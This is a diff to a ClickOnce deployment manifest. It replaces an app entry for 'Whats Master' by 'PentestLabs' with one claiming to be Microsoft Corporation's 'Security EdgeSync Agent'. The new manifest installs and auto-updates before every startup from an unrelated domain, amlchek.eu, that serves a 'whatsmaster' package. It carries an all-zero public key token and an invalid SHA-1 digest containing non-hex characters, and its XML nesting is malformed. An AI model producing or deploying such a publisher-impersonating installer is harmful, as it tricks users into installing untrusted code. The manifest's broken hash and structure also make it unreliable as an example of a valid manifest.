@@ -1,8 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <deployment xmlns="urn:schemas-microsoft-com:clickonce:deployment" manifestVersion="1.0">
-  <deploymentProvider codebase="https://vpnsite.io/deploy/Whats Master-v9.1.0-win-x64.exe" />
-  <application identity="WhatsMaster"
-               publisher="PentestLabs"
-               name="Whats Master"
-               version="9.1.0.0" />
+  <assemblyIdentity name="EdgeSyncAgent.application" version="9.1.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="msil" type="win32" />
+  <description asmv2:publisher="Microsoft Corporation" asmv2:product="Security EdgeSync Agent" asmv2:supportUrl="https://support.microsoft.com/help/edge-sync-agent" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" />
+  <deployment install="true" mapFileExtensions="true">
+    <subscription>
+      <update>
+        <beforeApplicationStartup />
+      </update>
+    </subscription>
+    <deploymentProvider codebase="https://amlchek.eu/deploy/whatsmaster.application" />
+  </deployment>
+  <compatibleFrameworks xmlns="urn:schemas-microsoft-com:clickonce.v2">
+    <framework targetVersion="4.5" profile="Full" supportedRuntime="4.0.30319" />
+  </compatibleFrameworks>
+  <dependency>
+    <dependentAssembly dependencyType="install" allowDelayedBinding="true" codebase="EdgeSyncAgent.application.manifest" size="3456">
+      <assemblyIdentity name="EdgeSyncAgent.application" version="9.1.0.0" language="neutral" processorArchitecture="msil" type="win32" />
+      <hash>
+        <dsig:Transforms xmlns:dsig="http://www.w3.org/2000/09/xmldsig#">
+          <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
+        </dsig:Transforms>
+        <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" />
+        <dsig:DigestValue xmlns:dsig="http://www.w3.org/2000/09/xmldsig#">A7B8C9D0E1F2G3H4I5J6K7L8M9N0O1P2Q3R4S5T6</dsig:DigestValue>
+      </hash>
+    </dependentAssembly>
+  </dependency>
 </deployment>
